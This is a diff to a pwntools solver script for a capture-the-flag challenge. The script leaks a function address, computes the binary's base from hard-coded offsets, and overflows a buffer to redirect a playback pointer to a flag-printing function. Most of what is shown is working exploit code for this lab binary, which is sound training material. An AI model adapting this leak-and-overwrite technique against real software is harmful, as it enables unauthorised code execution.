@@ -16,10 +16,13 @@ Chain:
      overflow *does* overwrite playback.
   6. Play slot 0 → ref_verdict() runs → flag.
 
-The shipped binary is stripped. This solver assumes you have an unstripped
-copy locally (same build flags, minus `strip`) so pwntools can resolve
-symbols. If not, replace `exe.symbols[...]` with hard-coded offsets from
-`objdump -d var_replay_buffer`.
+The shipped binary is stripped. Offsets below were recovered by compiling
+an unstripped twin inside the same ubuntu:22.04 build environment and
+reading symbols with `nm`; they're pinned here so the solver works
+against the Docker image without needing a symbolized reference binary.
+
+If you rebuild the challenge with a different compiler/libc, re-run
+`nm` on an unstripped twin and update OFF_HIGHLIGHT / OFF_REFVERDICT.
 """
 from pwn import *
 
@@ -28,6 +31,10 @@ context.log_level = "info"
 
 BIN = "./var_replay_buffer"
 
+# Offsets inside the stripped Docker binary (ubuntu:22.04 + gcc 11.4)
+OFF_HIGHLIGHT  = 0x1329
+OFF_REFVERDICT = 0x148c
+
 def start():
     if args.REMOTE:
         host = args.HOST or "localhost"
@@ -35,7 +42,6 @@ def start():
         return remote(host, port)
     return process(BIN)
 
-exe = ELF(BIN, checksec=False)
 io = start()
 
 def choose(n):
@@ -71,10 +77,11 @@ leaked = io.recv(6).ljust(8, b"\x00")
 highlight_addr = u64(leaked)
 log.success(f"highlight_reel @ {hex(highlight_addr)}")
 
-base = highlight_addr - exe.symbols["highlight_reel"]
+base = highlight_addr - OFF_HIGHLIGHT
+assert base & 0xfff == 0, f"base not page-aligned: {hex(base)} — offsets may be wrong"
 log.success(f"binary base  @ {hex(base)}")
 
-ref_verdict = base + exe.symbols["ref_verdict"]
+ref_verdict = base + OFF_REFVERDICT
 log.success(f"ref_verdict  @ {hex(ref_verdict)}")
 
 # --- Step 4: overflow playback with ref_verdict ---
